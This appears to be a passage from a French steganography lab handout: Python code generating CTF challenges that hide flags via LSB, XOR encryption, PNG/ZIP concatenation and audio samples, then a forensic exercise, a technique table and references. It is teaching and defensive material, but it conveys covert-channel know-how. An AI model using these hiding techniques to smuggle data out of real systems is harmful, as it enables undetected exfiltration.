        import zipfile
        zip_bytes = io.BytesIO()
        with zipfile.ZipFile(zip_bytes, 'w') as zf:
            zf.writestr('secret.txt', flag)
        zip_data = zip_bytes.getvalue()

        # Concaténer PNG + ZIP
        with open(output, 'wb') as f:
            f.write(png_data)
            f.write(zip_data)

        print(f"✅ Challenge 3 généré : {output}")
        print(f"   INDICE : binwalk {output} | hexdump -C {output} | tail -20")

    @staticmethod
    def challenge_4_lsb_encrypted(output: str,
                                   flag: str = "FLAG{crypto_stego_combined}",
                                   password: str = "stego2026"):
        """
        NIVEAU : Intermédiaire-Avancé
        TECHNIQUE : LSB avec chiffrement XOR simple
        INDICE : Tester des mots de passe courants, analyser les LSBs
        """
        img = np.random.randint(0, 256, (300, 300, 3), dtype=np.uint8)

        # Chiffrement XOR simple (pédagogique, pas AES)
        key = hashlib.sha256(password.encode()).digest()
        flag_bytes = flag.encode()
        encrypted = bytes(b ^ key[i % len(key)] for i, b in enumerate(flag_bytes))
        encrypted += b'\x00'  # marqueur de fin

        # Encoder en LSB avec dispersion par mot de passe
        import hashlib
        seed = int.from_bytes(hashlib.sha256(password.encode()).digest()[:8], 'big')
        rng = random.Random(seed)
        indices = list(range(img.size))
        rng.shuffle(indices)

        flat = img.flatten()
        bits = []
        for byte in encrypted:
            for i in range(7, -1, -1):
                bits.append((byte >> i) & 1)

        for i, bit in enumerate(bits):
            flat[indices[i]] = (flat[indices[i]] & 0xFE) | bit

        Image.fromarray(flat.reshape(img.shape)).save(output)
        print(f"✅ Challenge 4 généré : {output}")
        print(f"   INDICE : LSB avec XOR et dispersion, mot de passe commun")

    @staticmethod
    def challenge_5_audio_lsb(output: str, flag: str = "FLAG{audio_secret_channel}"):
        """
        NIVEAU : Avancé
        TECHNIQUE : LSB dans les samples d'un fichier WAV
        INDICE : Analyser les LSBs des samples audio
        """
        import math
        sample_rate = 44100
        duration = 2.0
        frequency = 440.0  # La4

        n_samples = int(sample_rate * duration)
        samples = [
            int(32767 * math.sin(2 * math.pi * frequency * i / sample_rate))
            for i in range(n_samples)
        ]

        # Encoder le flag dans les LSBs des samples
        flag_bytes = flag.encode() + b'\x00\x00'
        bits = []
        for byte in flag_bytes:
            for i in range(7, -1, -1):
                bits.append((byte >> i) & 1)

        for i, bit in enumerate(bits[:len(samples)]):
            samples[i] = (samples[i] & ~1) | bit

        with wave.open(output, 'w') as f:
            f.setnchannels(1)
            f.setsampwidth(2)
            f.setframerate(sample_rate)
            f.writeframes(st.pack('<' + 'h' * len(samples), *samples))

        print(f"✅ Challenge 5 généré : {output}")
        print(f"   INDICE : Extraire les LSBs des samples WAV 16-bit")


# Générer tous les challenges
import hashlib

gen = ChallengeGenerator()
gen.challenge_1_basic_lsb('/tmp/chall1.png')
gen.challenge_2_metadata_trick('/tmp/chall2.png')
gen.challenge_3_file_in_file('/tmp/chall3.png')
gen.challenge_4_lsb_encrypted('/tmp/chall4.png')
gen.challenge_5_audio_lsb('/tmp/chall5.wav')

print("\n=== CHALLENGES GÉNÉRÉS ===")
print("Résolvez-les dans l'ordre croissant de difficulté.")
print("Bon courage !")
```

---

## Chapitre 18 : Challenge Final

### 🔴 Mission — Analyse forensique complète

```
CONTEXTE :
  Vous êtes analyste forensique dans une équipe de réponse à incident.
  Un serveur interne a été compromis et l'attaquant a utilisé
  la stéganographie pour exfiltrer des données.
  
  Vous avez intercepté 5 fichiers suspects.
  Votre mission : analyser chacun, extraire les données cachées,
  reconstituer le message complet de l'attaquant.

FICHIERS À ANALYSER (à générer avec les fonctions ci-dessus) :
  evidence_01.png  → Stéganographie dans le canal alpha (RGBA)
  evidence_02.jpg  → Données dans les métadonnées EXIF
  evidence_03.wav  → LSB dans les samples audio
  evidence_04.pcap → Canal caché dans les champs IP (à analyser dans Wireshark)
  evidence_05.png  → Fichier caché après l'EOF

PARTIE A — EXTRACTION (50 points)
  1. Identifier la technique stéganographique dans chaque fichier
  2. Extraire les données cachées
  3. Reconstituer le message fragmenté sur les 5 fichiers

PARTIE B — RAPPORT FORENSIQUE (30 points)
  Rédiger un rapport incluant :
  - Méthode de détection utilisée pour chaque fichier
  - Outils employés avec commandes exactes
  - Preuve de l'exfiltration (hashes des données extraites)
  - Reconstruction de la timeline de l'attaquant

PARTIE C — CONTRE-MESURES (20 points)
  Proposer et implémenter :
  1. Un script de détection qui analyserait automatiquement
     les fichiers images entrant dans le réseau
  2. Une politique de sécurité pour prévenir ce type d'exfiltration
  3. Une règle SIEM pour détecter les canaux DNS covert
```

---

# ANNEXES

---

## Annexe A — Comparaison des Techniques

```
┌──────────────────┬──────────┬──────────┬──────────┬──────────┐
│  Technique       │ Capacité │ Imperç.  │ Robust.  │ Détect.  │
├──────────────────┼──────────┼──────────┼──────────┼──────────┤
│ LSB naïf         │  Haute   │  Haute   │ Faible   │  Facile  │
│ LSB dispersé     │  Haute   │  Haute   │ Faible   │  Moyen   │
│ WOW/HUGO         │ Moyenne  │  Très H  │ Faible   │  Difficile│
│ DCT (JPEG)       │ Moyenne  │  Haute   │ Moyenne  │  Moyen   │
│ F5               │ Moyenne  │  Haute   │ Moyenne  │  Difficile│
│ Spread Spectrum  │ Faible   │  Haute   │  Haute   │  Difficile│
│ Watermark blind  │ Très F   │  Haute   │ Très H   │  Difficile│
│ Canal IP ID      │  Faible  │ Moyenne  │ Moyenne  │  Facile  │
│ Canal DNS        │  Faible  │  Haute   │ Moyenne  │  Moyen   │
│ Timing channel   │  Très F  │  Haute   │ Moyenne  │  Difficile│
└──────────────────┴──────────┴──────────┴──────────┴──────────┘
```

## Annexe B — Bibliothèques Python Utiles

```bash
# Installation complète pour ce TP
pip install Pillow numpy scipy scikit-image \
            cryptography argon2-cffi \
            scapy  \
            matplotlib opencv-python

# Outils système
apt install steghide stegdetect outguess binwalk \
            exiftool foremost wireshark-common \
            zsteg  # via gem install zsteg
```

## Annexe C — Ressources de Référence

```
PAPERS FONDAMENTAUX :
  Simmons (1983) — The Prisoners' Problem — Santa Fe
  Cachin (1998) — An Information-Theoretic Model for Steganography
  Westfeld, Pfitzmann (2000) — Attacks on Steganographic Systems — IHW
  Fridrich (2001) — RS Steganalysis — ICME
  Provos, Honeyman (2003) — Hide and Seek: An Introduction to Steganography

OUTILS ET RESSOURCES :
  https://github.com/openstego/openstego          → OpenStego
  https://github.com/RickdeJager/stegseek         → StegSeek (fast)
  https://github.com/eugenekolo/sec-tools         → CTF tools
  https://georgeom.net/StegOnline/upload           → Online steg analysis
  https://stylesuxx.github.io/steganography/       → Online LSB demo

CTF STÉGANOGRAPHIE :
  https://ctftime.org  → CTF challenges (filter: stego)
  PicoCTF            → https://picoctf.org
  HackTheBox         → https://hackthebox.com
  CryptoHack         → https://cryptohack.org

DATASETS ACADÉMIQUES :
  BOSS Dataset → http://agents.fel.cvut.cz/boss/
  BOWS2        → http://bows2.gipsa-lab.inpg.fr/
  BOSSBase     → Base d'images pour évaluer les systèmes de stéganalyse
```

---

*TP rédigé en référence aux publications académiques fondamentales et aux standards actuels.*  
*Les techniques réseaux (canaux cachés) ne doivent être pratiquées que dans des environnements contrôlés.*  
*La stéganographie, comme la cryptographie, est un outil neutre — sa légalité dépend de l'usage.*  
*Principe éthique : étudier les attaques pour mieux défendre.*
